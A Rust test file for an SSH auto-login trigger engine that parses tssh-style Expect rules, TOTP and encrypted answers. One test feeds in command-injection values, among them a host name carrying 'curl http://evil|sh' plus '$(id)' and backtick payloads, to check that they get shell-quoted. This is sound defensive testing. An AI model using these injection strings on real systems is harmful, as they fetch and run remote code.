use super::*;
use serde_json::json;

fn no_secrets(_key: &str) -> Option<String> {
    None
}

fn slot_secrets(key: &str) -> Option<String> {
    match key {
        "trigger_answer_1" => Some("s3cret-one".to_string()),
        "trigger_answer_2" => Some("s3cret-two".to_string()),
        _ => None,
    }
}

fn parse_config(value: serde_json::Value) -> TriggersConfig {
    parse_triggers(Some(&value), &slot_secrets)
        .expect("config must parse")
        .expect("config must be enabled")
}

fn parse_err(value: serde_json::Value) -> String {
    parse_triggers(Some(&value), &slot_secrets).expect_err("config must be rejected")
}

// —— 解析与校验（D7/D8）———————————————————————————

#[test]
fn parse_minimal_object_config_with_defaults() {
    let config = parse_config(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r" }]
    }));
    assert_eq!(config.timeout_secs, DEFAULT_TIMEOUT_SECS);
    assert_eq!(config.sleep_ms, DEFAULT_SLEEP_MS);
    assert_eq!(config.pass_sleep, PassSleep::None);
    assert_eq!(config.stages.len(), 1);
    assert!(config.stages[0].case.is_none());
}

#[test]
fn parse_accepts_json_string_form() {
    // 连接表单 textarea 送达的是字符串形态。
    let config = parse_triggers(
        Some(&json!(
            r#"{"stages":[{"pattern":"code","sendText":"1\r"}]}"#
        )),
        &no_secrets,
    )
    .unwrap()
    .unwrap();
    assert_eq!(config.stages.len(), 1);
}

#[test]
fn parse_empty_or_stageless_config_disables_feature() {
    for value in [
        json!(null),
        json!(""),
        json!("   "),
        json!({}),
        json!({ "timeoutSecs": 30 }),
        json!({ "stages": [] }),
    ] {
        assert!(
            parse_triggers(Some(&value), &no_secrets).unwrap().is_none(),
            "expected disabled for {value}"
        );
    }
    assert!(parse_triggers(None, &no_secrets).unwrap().is_none());
}

#[test]
fn parse_rejects_invalid_json_string() {
    let error = parse_triggers(Some(&json!("{not json")), &no_secrets).unwrap_err();
    assert!(error.contains("invalid JSON"), "{error}");
    // 非 JSON 对象/字符串形态同样拒绝。
    let error = parse_triggers(Some(&json!(42)), &no_secrets).unwrap_err();
    assert!(error.contains("expected a JSON object"), "{error}");
}

#[test]
fn parse_json_enabled_flag_switches_engine_without_deleting_stages() {
    // enabled:false 保留规则但显式关闭引擎；enabled:true 等价缺省。
    let disabled = json!({
        "enabled": false,
        "stages": [{ "pattern": "code", "sendText": "1\\r" }]
    });
    assert!(parse_triggers(Some(&disabled), &no_secrets)
        .unwrap()
        .is_none());
    let enabled = json!({
        "enabled": true,
        "stages": [{ "pattern": "code", "sendText": "1\\r" }]
    });
    assert!(parse_triggers(Some(&enabled), &no_secrets)
        .unwrap()
        .is_some());
    let error = parse_err(json!({ "enabled": "yes", "stages": [] }));
    assert!(error.contains("triggers.enabled"), "{error}");
}

#[test]
fn parse_tssh_text_form_maps_directives() {
    // tssh（trzsz-ssh）自动交互文本形态：#!! 前缀、Expect* 指令。
    let text = [
        "#!! ExpectCount 2",
        "#!! ExpectTimeout 45",
        "#!! ExpectSleepMS 250",
        "#!! ExpectPassSleep enter",
        "#!! ExpectPattern1 (?i)are you sure",
        "#!! ExpectSendText1 yes\\r",
        "#!! ExpectCaseSendText2 continue\\? no",
        "#!! ExpectPattern2 hostname.*$",
        "#!! ExpectSendOtp2 oathtool --totp -b K",
    ]
    .join("\n");
    let config = parse_triggers(Some(&json!(text)), &no_secrets)
        .unwrap()
        .unwrap();
    assert_eq!(config.timeout_secs, 45);
    assert_eq!(config.sleep_ms, 250);
    assert_eq!(config.pass_sleep, PassSleep::Enter);
    assert_eq!(config.stages.len(), 2);
    assert_eq!(config.stages[0].answer, StageAnswer::Text("yes\\r".into()));
    let case = config.stages[1].case.as_ref().expect("case rule parsed");
    assert!(case.pattern.is_match("continue?"));
    assert_eq!(
        config.stages[1].answer,
        StageAnswer::Command("oathtool --totp -b K".into())
    );
}

#[test]
fn parse_tssh_expect_count_gates_and_truncates() {
    // ExpectCount 0 是 tssh 语义的显式关闭；缺省时不让粘贴的规则静默失效。
    let off = "ExpectCount 0\nExpectPattern1 code\nExpectSendText1 yes";
    assert!(parse_triggers(Some(&json!(off)), &no_secrets)
        .unwrap()
        .is_none());
    let on = "ExpectPattern1 code\nExpectSendText1 yes";
    let config = parse_triggers(Some(&json!(on)), &no_secrets)
        .unwrap()
        .unwrap();
    assert_eq!(config.stages.len(), 1);
    // ExpectCount 截断超出序号的阶段。
    let truncated = [
        "ExpectCount 1",
        "ExpectPattern1 a",
        "ExpectSendText1 x",
        "ExpectPattern2 b",
        "ExpectSendText2 y",
    ]
    .join("\n");
    let config = parse_triggers(Some(&json!(truncated)), &no_secrets)
        .unwrap()
        .unwrap();
    assert_eq!(config.stages.len(), 1);
    assert_eq!(config.stages[0].pattern.as_str(), "a");
}

#[test]
fn parse_tssh_non_regex_pattern_falls_back_to_literal() {
    // tssh README 示例 `*assword` 不是合法正则：文本形态按字面量匹配兜底，
    // JSON 形态保持 D7 严格失败不受影响。
    let text = "ExpectPattern1 *assword\nExpectSendText1 pw\\r";
    let config = parse_triggers(Some(&json!(text)), &no_secrets)
        .unwrap()
        .unwrap();
    assert!(config.stages[0].pattern.is_match("Enter *assword:"));
    assert!(!config.stages[0].pattern.is_match("Enter password:"));
}

#[test]
fn parse_tssh_ciphertext_and_totp_answers_are_fully_supported() {
    // tssh --enc-secret 密文与 TOTP 指令全兼容（0.4.77）：与 tssh 同款
    // AES-256-GCM 固定密钥解密，TOTP 按 RFC 6238 生成。
    fn tssh_encrypt(plaintext: &[u8]) -> String {
        use aes_gcm::aead::Aead;
        let cipher = Aes256Gcm::new(TSSH_ENC_SECRET_KEY.into());
        let nonce = &Nonce::try_from(&b"0123456789ab"[..]).expect("12-byte GCM nonce");
        // tssh Seal(nonce, nonce, secret, nil) prefixes the nonce itself.
        let mut blob = nonce.to_vec();
        blob.extend_from_slice(&cipher.encrypt(nonce, plaintext).unwrap());
        data_encoding::HEXLOWER.encode(&blob)
    }
    let pass_blob = tssh_encrypt(b"s3cret-pass");
    let otp_blob = tssh_encrypt(b"oathtool --totp -b K");
    let totp_blob = tssh_encrypt(b"GEZDGNBVGY3TQOJQ");

    let text = format!(
        "#!! ExpectCount 2\n\
         #!! ExpectPattern1 *assword\n\
         #!! ExpectSendPass1 {pass_blob}\n\
         #!! ExpectCaseSendPass1 token {pass_blob}\n\
         #!! ExpectPattern2 token:\n\
         #!! ExpectSendEncTotp2 {totp_blob}"
    );
    let config = parse_triggers(Some(&json!(text)), &no_secrets)
        .unwrap()
        .unwrap();
    assert_eq!(
        config.stages[0].answer,
        StageAnswer::Secret("s3cret-pass".into())
    );
    let case = config.stages[0].case.as_ref().expect("case rule parsed");
    assert_eq!(case.answer, StageAnswer::Secret("s3cret-pass".into()));
    assert_eq!(
        config.stages[1].answer,
        StageAnswer::Totp(b"1234567890".to_vec()),
        "decrypted base32 secret is decoded to raw key bytes"
    );

    // ExpectSendEncOtpN 解密后是本地命令（= sendCommand）。
    let text = format!("ExpectPattern1 token:\nExpectSendEncOtp1 {otp_blob}");
    let config = parse_triggers(Some(&json!(text)), &no_secrets)
        .unwrap()
        .unwrap();
    assert_eq!(
        config.stages[0].answer,
        StageAnswer::Command("oathtool --totp -b K".into())
    );

    // ExpectSendTotpN：明文 base32 密钥直接解码（GEZDGNBVGY3TQOJQ → "1234567890"）。
    let config = parse_triggers(
        Some(&json!(
            "#!! ExpectPattern1 code\n#!! ExpectSendTotp1 gezd gnbv gy3t qojq"
        )),
        &no_secrets,
    )
    .unwrap()
    .unwrap();
    assert_eq!(
        config.stages[0].answer,
        StageAnswer::Totp(b"1234567890".to_vec())
    );
}

#[test]
fn totp_code_matches_rfc6238_sha1_vectors() {
    // RFC 6238 附录 B（SHA1，8 位截 6 位）；密钥为 ASCII "12345678901234567890"。
    let secret = b"12345678901234567890";
    assert_eq!(totp_code(secret, 59_000), "287082");
    assert_eq!(totp_code(secret, 1_111_111_109_000), "081804");
    assert_eq!(totp_code(secret, 1_234_567_890_000), "005924");
    assert_eq!(totp_code(secret, 2_000_000_000_000), "279037");
}

#[test]
fn engine_answers_totp_stage_with_fresh_code() {
    // RFC 6238 向量密钥（ASCII "12345678901234567890" 的 base32）。
    let config = parse_config(json!({
        "stages": [{ "pattern": "token:", "sendTotp": "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ" }]
    }));
    let mut engine = TriggerEngine::new(config, CommandPlaceholders::new("h", "u", 22, "n"));
    let decision = engine
        .observe("Please enter token: ", 59_000)
        .expect("stage must answer");
    assert_eq!(decision.kind, TriggerKind::Secret);
    assert_eq!(
        decision.segments,
        pass_sleep_segments("287082", 100, PassSleep::None),
        "segments carry the code generated at match time"
    );
}

#[test]
fn parse_tssh_ciphertext_and_totp_inputs_still_validate() {
    // 非法 hex / 截断 blob / 非法 base32 → 明确报错（连接失败，D7）。
    for text in [
        "#!! ExpectSendPass1 d7983b4a",
        "#!! ExpectSendEncTotp1 zznot-hex",
        "#!! ExpectSendTotp1 not!base32",
    ] {
        let error = parse_triggers(Some(&json!(text)), &no_secrets).expect_err("must be rejected");
        assert!(
            error.contains("enc-secret") || error.contains("base32"),
            "{error}"
        );
    }
    let error = parse_triggers(
        Some(&json!({
            "stages": [{ "pattern": "code", "sendTotp": "not!base32" }]
        })),
        &no_secrets,
    )
    .unwrap_err();
    assert!(error.contains("base32"), "{error}");
}

#[test]
fn parse_tssh_unknown_directive_errors_but_json_errors_stay_json() {
    let error = parse_triggers(Some(&json!("#!! ExpectWrong1 foo")), &no_secrets)
        .expect_err("must be rejected");
    assert!(error.contains("unknown directive"), "{error}");
    // 非法 JSON 且不含 Expect 指令 → 维持原 JSON 报错，不被 tssh 分流吞掉。
    let error = parse_triggers(Some(&json!("{not json")), &no_secrets).unwrap_err();
    assert!(error.contains("invalid JSON"), "{error}");
    // 无阶段的全局指令 = 功能关闭。
    assert!(
        parse_triggers(Some(&json!("#!! ExpectCount 3")), &no_secrets)
            .unwrap()
            .is_none()
    );
}

#[test]
fn parse_enforces_answer_three_way_choice() {
    let error = parse_err(json!({ "stages": [{ "pattern": "code" }] }));
    assert!(error.contains("exactly one of sendText"), "{error}");
    let error = parse_err(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r", "sendCommand": "echo hi" }]
    }));
    assert!(error.contains("mutually exclusive"), "{error}");
}

#[test]
fn parse_enforces_case_group_rules() {
    // case 应答缺 casePattern。
    let error = parse_err(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r", "caseSendText": "y" }]
    }));
    assert!(error.contains("require casePattern"), "{error}");
    // casePattern 缺 case 应答。
    let error = parse_err(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r", "casePattern": "y/n" }]
    }));
    assert!(error.contains("exactly one of caseSendText"), "{error}");
    // case 应答二选一。
    let error = parse_err(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r",
            "casePattern": "y/n", "caseSendText": "y", "caseSendSecretKey": "trigger_answer_2" }]
    }));
    assert!(error.contains("exactly one of caseSendText"), "{error}");
    // 合法 case 组解析成功。
    let config = parse_config(json!({
        "stages": [{ "pattern": "code", "sendText": "1\\r",
            "casePattern": "\\(y/n\\)", "caseSendText": "y" }]
    }));
    assert!(config.stages[0].case.is_some());
}

#[test]
fn parse_enforces_limits() {
    // 阶段数上限 16（D8）。
    let stages: Vec<_> = (0..17)
        .map(|index| json!({ "pattern": format!("p{index}"), "sendText": "1\\r" }))
        .collect();
    let error = parse_err(json!({ "stages": stages }));
    assert!(error.contains("at most 16"), "{error}");
    // pattern 长度上限 512（对齐 MAX_PROMPT_HINT_LEN）。
    let error = parse_err(json!({
        "stages": [{ "pattern": "a".repeat(513), "sendText": "1\\r" }]
    }));
    assert!(error.contains("exceeds 512"), "{error}");
    // timeoutSecs 1..=600。
    for timeout in [0u64, 601] {
        let error = parse_err(json!({
            "stages": [{ "pattern": "p", "sendText": "1\\r" }], "timeoutSecs": timeout
        }));
        assert!(error.contains("timeoutSecs"), "{error}");
    }
    // sleepMs 0..=5000。
    let error = parse_err(json!({
        "stages": [{ "pattern": "p", "sendText": "1\\r" }], "sleepMs": 5001
    }));
    assert!(error.contains("sleepMs"), "{error}");
    // passSleep 枚举。
    let error = parse_err(json!({
        "stages": [{ "pattern": "p", "sendText": "1\\r" }], "passSleep": "sometimes"
    }));
    assert!(error.contains("none, each or enter"), "{error}");
}

#[test]
fn parse_rejects_uncompilable_regex() {
    let error = parse_err(json!({
        "stages": [{ "pattern": "code(", "sendText": "1\\r" }]
    }));
    assert!(error.contains("stages[1].pattern"), "{error}");
}

#[test]
fn parse_rejects_unknown_secret_slot() {
    // 未知槽位拒绝（D5：只有两个固定槽位）。
    let error = parse_err(json!({
        "stages": [{ "pattern": "code", "sendSecretKey": "my_own_key" }]
    }));
    assert!(error.contains("unknown secret slot"), "{error}");
}

#[test]
fn parse_rejects_empty_secret_slot() {
    let error = parse_triggers(
        Some(&json!({
            "stages": [{ "pattern": "code", "sendSecretKey": "trigger_answer_1" }]
        })),
        &no_secrets,
    )
    .unwrap_err();
    assert!(error.contains("is empty"), "{error}");
    // 已填充槽位解析为密文应答。
    let config = parse_config(json!({
        "stages": [{ "pattern": "code", "sendSecretKey": "trigger_answer_1" }]
    }));
    assert_eq!(config.stages[0].answer.kind(), "secret");
}

#[test]
fn debug_redacts_secret_answers() {
    let config = parse_config(json!({
        "stages": [{ "pattern": "code", "sendSecretKey": "trigger_answer_1" }]
    }));
    let dump = format!("{config:?}");
    assert!(!dump.contains("s3cret-one"), "debug leaked secret: {dump}");
    assert!(dump.contains("<redacted>"), "{dump}");
}

// —— sendText 转义与分段 ——————————————————————————

#[test]
fn parse_send_text_escapes_and_splits() {
    assert_eq!(parse_send_text("abc"), vec!["abc"]);
    // \r \n \t 解释为控制字符。
    assert_eq!(parse_send_text(r"a\rb\nc\td"), vec!["a\rb\nc\td"]);
    // \| 为分段停顿符。
    assert_eq!(parse_send_text(r"first\|second"), vec!["first", "second"]);
    // 其余反斜杠原样。
    assert_eq!(parse_send_text(r"a\qb"), vec![r"a\qb"]);
    assert_eq!(parse_send_text(r"trail\"), vec![r"trail\"]);
    // 空段（\|\|）保留为停顿。
    assert_eq!(parse_send_text(r"a\|\|b"), vec!["a", "", "b"]);
}

#[test]
fn text_segments_carry_sleep_delays() {
    let segments = text_segments(r"go\|slow", 250);
    assert_eq!(
        segments,
        vec![(b"go".to_vec(), 0), (b"slow".to_vec(), 250),]
    );
}

#[test]
fn pass_sleep_shapes_secret_segments() {
    // none：整段 + \r 一次写入。
    assert_eq!(
        pass_sleep_segments("pw", 100, PassSleep::None),
        vec![(b"pw\r".to_vec(), 0)]
    );
    // each：逐字符 + sleep，Enter 拼在最后一个字符后。
    assert_eq!(
        pass_sleep_segments("ab", 40, PassSleep::Each),
        vec![(b"a".to_vec(), 0), (b"b\r".to_vec(), 40)]
    );
    // 空应答 only Enter。
    assert_eq!(
        pass_sleep_segments("", 40, PassSleep::Each),
        vec![(b"\r".to_vec(), 0)]
    );
    // enter：应答、停顿、Enter。
    assert_eq!(
        pass_sleep_segments("ab", 60, PassSleep::Enter),
        vec![(b"ab".to_vec(), 0), (b"\r".to_vec(), 60)]
    );
}

// —— 引擎行为 ——————————————————————————————————

fn text_engine(pattern: &str, text: &str) -> TriggerEngine {
    TriggerEngine::new(
        parse_config(
            json!({ "stages": [{ "pattern": format!("(?i){pattern}"), "sendText": text }] }),
        ),
        CommandPlaceholders::new("host", "user", 22, "name"),
    )
}

#[test]
fn engine_matches_and_advances_cursor() {
    let config = parse_config(json!({
        "stages": [
            { "pattern": "login:", "sendText": "user\\r" },
            { "pattern": "code:", "sendText": "42\\r" }
        ]
    }));
    let mut engine = TriggerEngine::new(config, CommandPlaceholders::new("h", "u", 22, "n"));
    let first = engine
        .observe("Welcome. login:", 1_000)
        .expect("stage 1 fires");
    assert_eq!(first.stage, 1);
    assert_eq!(first.kind, TriggerKind::Text);
    assert_eq!(first.segments, vec![(b"user\r".to_vec(), 0)]);
    let second = engine
        .observe("verification code:", 1_100)
        .expect("stage 2 fires");
    assert_eq!(second.stage, 2);
    assert_eq!(second.segments, vec![(b"42\r".to_vec(), 0)]);
    // 游标已回卷：stage 1 的 pattern 再次命中可重新触发。
    let third = engine.observe("login:", 1_200).expect("wraps to stage 1");
    assert_eq!(third.stage, 1);
}

#[test]
fn engine_matches_across_chunks() {
    let mut engine = text_engine("verification code", "1234\r");
    assert!(
        engine.observe("Verifica", 1_000).is_none(),
        "partial chunk must not fire"
    );
    let decision = engine
        .observe("tion code:", 1_050)
        .expect("cross-chunk match");
    assert_eq!(decision.stage, 1);
    assert_eq!(decision.segments, vec![(b"1234\r".to_vec(), 0)]);
}

#[test]
fn engine_case_pre_match_does_not_advance_cursor() {
    let config = parse_config(json!({
        "stages": [
            { "pattern": "server ready", "sendText": "go\\r",
              "casePattern": "continue\\? \\(y/n\\)", "caseSendText": "y" },
            { "pattern": "done", "sendText": "ok\\r" }
        ]
    }));
    let mut engine = TriggerEngine::new(config, CommandPlaceholders::new("h", "u", 22, "n"));
    let case = engine
        .observe("continue? (y/n)", 1_000)
        .expect("case rule fires");
    assert_eq!(case.stage, 1);
    assert_eq!(case.segments, vec![(b"y".to_vec(), 0)]);
    // case 命中不推进游标：随后本阶段 pattern 命中仍是 stage 1。
    let stage = engine.observe("server ready", 1_100).expect("stage fires");
    assert_eq!(stage.stage, 1);
    assert_eq!(stage.segments, vec![(b"go\r".to_vec(), 0)]);
    // 游标此刻在 stage 2。
    let second = engine.observe("done", 1_200).expect("stage 2 fires");
    assert_eq!(second.stage, 2);
}

#[test]
fn engine_shell_prompt_resets_cursor() {
    let config = parse_config(json!({
        "stages": [
            { "pattern": "login:", "sendText": "user\\r" },
            { "pattern": "password:", "sendText": "pw\\r" }
        ]
    }));
    let mut engine = TriggerEngine::new(config, CommandPlaceholders::new("h", "u", 22, "n"));
    assert!(engine.observe("login:", 1_000).is_some());
    // 登录序列被 shell 提示打断：游标归零（D3），下一轮从 stage 1 开始。
    assert!(engine.observe("user@host:~$ ", 1_100).is_none());
    let again = engine
        .observe("login:", 1_200)
        .expect("re-armed at stage 1");
    assert_eq!(again.stage, 1);
}

#[test]
fn engine_timeout_resets_and_reports() {
    let mut engine = TriggerEngine::new(
        parse_config(json!({
            "timeoutSecs": 1,
            "stages": [
                { "pattern": "login:", "sendText": "user\\r" },
                { "pattern": "password:", "sendText": "pw\\r" }
            ]
        })),
        CommandPlaceholders::new("h", "u", 22, "n"),
    );
    assert!(
        engine.observe("login:", 1_000).is_some(),
        "stage 1 answered"
    );
    assert!(engine.observe("still waiting", 1_500).is_none());
    let timeout = engine
        .observe("still waiting", 2_001)
        .expect("timeout fires");
    assert_eq!(timeout.stage, 2, "timeout reports the pending stage");
    assert_eq!(timeout.kind, TriggerKind::Timeout);
    assert!(timeout.segments.is_empty());
    // 超时后游标归零：stage 1 的 pattern 可以直接再次命中。
    let again = engine.observe("login:", 2_100).expect("re-armed");
    assert_eq!(again.stage, 1);
}

#[test]
fn engine_reset_rearms_stage_one_immediately() {
    // Telnet 声明式自动登录的失败重试：游标停在 stage 2 等密码提示时，
    // reset() 立即归位，宿主重印 login: 无需等超时即从用户名重答。
    let mut engine = TriggerEngine::new(
        parse_config(json!({
            "stages": [
                { "pattern": "login:", "sendText": "user\\r" },
                { "pattern": "password:", "sendSecret": "pw" }
            ]
        })),
        CommandPlaceholders::new("h", "u", 22, "n"),
    );
    assert!(engine.observe("login:", 1_000).is_some(), "stage 1");
    // 游标已在 stage 2：login: 不再命中。
    assert!(engine.observe("login:", 1_500).is_none());
    engine.reset(1_600);
    let decision = engine
        .observe("login:", 1_700)
        .expect("stage 1 re-answered");
    assert_eq!(decision.stage, 1);
    assert_eq!(decision.kind, TriggerKind::Text);
}

#[test]
fn engine_idle_wait_does_not_time_out() {
    // 空闲等 stage 1 是事件驱动的无限期等待：超时只在序列中途生效，
    // 否则闲置会话每 timeoutSecs 刷一次 timeout 事件。
    let mut engine = TriggerEngine::new(
        parse_config(json!({
            "timeoutSecs": 1,
            "stages": [
                { "pattern": "login:", "sendText": "user\\r" },
                { "pattern": "password:", "sendText": "pw\\r" }
            ]
        })),
        CommandPlaceholders::new("h", "u", 22, "n"),
    );
    for now_ms in [1_000u64, 5_000, 60_000, 600_000] {
        assert!(
            engine.observe("unrelated output", now_ms).is_none(),
            "idle stage-1 wait must not report timeout"
        );
    }
    assert_eq!(engine.stage_cursor, 0, "cursor stays armed at stage 1");
    // 空闲后照样能直接命中 stage 1。
    let first = engine.observe("login:", 610_000).expect("stage 1 fires");
    assert_eq!(first.stage, 1);
    // 进入序列中途后，超时语义恢复正常。
    let timeout = engine
        .observe("unrelated output", 611_100)
        .expect("mid-sequence timeout fires");
    assert_eq!(timeout.kind, TriggerKind::Timeout);
}

#[test]
fn engine_strips_ansi_before_matching() {
    let mut engine = text_engine("verification code", "1\\r");
    let decision = engine
        .observe("\x1b[1mVerification CODE:\x1b[0m", 1_000)
        .expect("ansi-wrapped prompt matches");
    assert_eq!(decision.stage, 1);
}

#[test]
fn engine_command_answer_defers_execution() {
    let mut engine = TriggerEngine::new(
        parse_config(json!({
            "stages": [{ "pattern": "code:", "sendCommand": "oathtool --totp -b %h" }]
        })),
        CommandPlaceholders::new("host1", "u", 22, "n"),
    );
    let decision = engine.observe("code:", 1_000).expect("command stage fires");
    assert_eq!(decision.kind, TriggerKind::Command);
    // 占位符替换发生在 execute_command（读循环调用侧），决策携带原命令。
    assert_eq!(decision.command.as_deref(), Some("oathtool --totp -b %h"));
    assert!(
        decision.segments.is_empty(),
        "command output is resolved by the caller"
    );
}

// —— 占位符与命令执行（D4）———————————————————————

#[test]
fn placeholders_substitution() {
    let placeholders = CommandPlaceholders::new("example.com", "deploy", 2222, "prod-box");
    assert_eq!(
        apply_command_placeholders("%u@%h:%p (%n) 100%%", &placeholders),
        "deploy@example.com:2222 (prod-box) 100%"
    );
    // 未知 %x 原样保留。
    assert_eq!(apply_command_placeholders("%s%z", &placeholders), "%s%z");
    assert_eq!(apply_command_placeholders("100%", &placeholders), "100%");
}

#[test]
fn placeholder_values_cannot_inject_shell_syntax() {
    // host/name 可来自 XShell / FinalShell / ssh_config 导入，导入链路不做
    // 元字符过滤（host 只拒空白与 ://，name 只 trim）。替换发生在 shell 解析
    // 之前，所以恶意名字若裸拼进命令串，`pass show %n` 会变成两条语句。
    let evil = CommandPlaceholders::new(
        "example.com; curl http://evil|sh",
        "deploy$(id)",
        2222,
        "prod`id`box",
    );
    let substituted = apply_command_placeholders("pass show %n", &evil);
    assert!(
        substituted.starts_with("pass show '"),
        "dangerous values must be quoted: {substituted}"
    );
    assert!(!substituted.contains("; curl"), "{substituted}");
    let host = apply_command_placeholders("%h", &evil);
    assert!(host.starts_with('\'') && host.ends_with('\''), "{host}");
    let user = apply_command_placeholders("%u", &evil);
    assert!(user.starts_with('\''), "{user}");
    // 普通值保持原样，模板可读性不受影响。
    let plain = CommandPlaceholders::new("example.com", "deploy", 2222, "prod-box");
    assert_eq!(apply_command_placeholders("%n", &plain), "prod-box");
}

#[cfg(unix)] // echo 单引号语义依赖 POSIX shell，Windows 下无对应行为
#[tokio::test]
async fn execute_command_echo_positive_case() {
    let placeholders = CommandPlaceholders::new("example.com", "deploy", 2222, "prod-box");
    // 占位符替换 + stdout 去单个结尾换行。
    let answer = execute_command(
        &ShellExecutor,
        "echo '%u@%h:%p'",
        &placeholders,
        Duration::from_secs(5),
    )
    .await
    .expect("echo must succeed");
    assert_eq!(answer.as_str(), "deploy@example.com:2222");
}

#[tokio::test]
async fn execute_command_strips_single_trailing_newline() {
    let placeholders = CommandPlaceholders::new("h", "u", 22, "n");
    let answer = execute_command(
        &ShellExecutor,
        "printf 'pw\\n\\n'",
        &placeholders,
        Duration::from_secs(5),
    )
    .await
    .expect("printf must succeed");
    assert_eq!(
        answer.as_str(),
        "pw\n",
        "exactly one trailing newline is stripped"
    );
    let answer = execute_command(
        &ShellExecutor,
        "printf 'pw\\r\\n'",
        &placeholders,
        Duration::from_secs(5),
    )
    .await
    .expect("printf must succeed");
    assert_eq!(answer.as_str(), "pw");
}

#[cfg(unix)] // 依赖 POSIX sleep/ExitStatusExt，Windows 下无语义
#[tokio::test]
async fn execute_command_timeout_negative_case() {
    let placeholders = CommandPlaceholders::new("h", "u", 22, "n");
    let error = execute_command(
        &ShellExecutor,
        "sleep 5",
        &placeholders,
        Duration::from_millis(150),
    )
    .await
    .expect_err("sleep must time out");
    assert!(error.contains("timed out"), "{error}");
}

#[cfg(unix)] // ExitStatusExt::from_raw 是 POSIX 专属
#[tokio::test]
async fn execute_command_reports_exit_code_without_output() {
    use std::os::unix::process::ExitStatusExt;

    struct FailingExecutor;
    impl CommandExecutor for FailingExecutor {
        fn run(
            &self,
            _command: &str,
        ) -> Pin<Box<dyn Future<Output = std::io::Result<Output>> + Send + '_>> {
            Box::pin(async {
                let output = Output {
                    status: std::process::ExitStatus::from_raw(3 << 8),
                    stdout: b"TOP SECRET OUTPUT".to_vec(),
                    stderr: Vec::new(),
                };
                Ok(output)
            })
        }
    }
    let placeholders = CommandPlaceholders::new("h", "u", 22, "n");
    let error = execute_command(
        &FailingExecutor,
        "false",
        &placeholders,
        Duration::from_secs(5),
    )
    .await
    .expect_err("non-zero exit must error");
    assert!(error.contains("exited with code 3"), "{error}");
    assert!(
        !error.contains("TOP SECRET"),
        "command output must never surface in errors: {error}"
    );
}

// —— 密文应答的发送计划（读循环消费）—————————————————

#[test]
fn secret_answer_segments_follow_pass_sleep() {
    let config = parse_config(json!({
        "sleepMs": 500,
        "passSleep": "enter",
        "stages": [{ "pattern": "code:", "sendSecretKey": "trigger_answer_1" }]
    }));
    let mut engine = TriggerEngine::new(config, CommandPlaceholders::new("h", "u", 22, "n"));
    let decision = engine.observe("code:", 1_000).expect("secret stage fires");
    assert_eq!(decision.kind, TriggerKind::Secret);
    // enter 形态：密文一次写入，停顿 500ms 后补 Enter（密文内容不出现在
    // 事件里，只进入发送计划）。
    assert_eq!(
        decision.segments,
        vec![(b"s3cret-one".to_vec(), 0), (b"\r".to_vec(), 500),]
    );
}
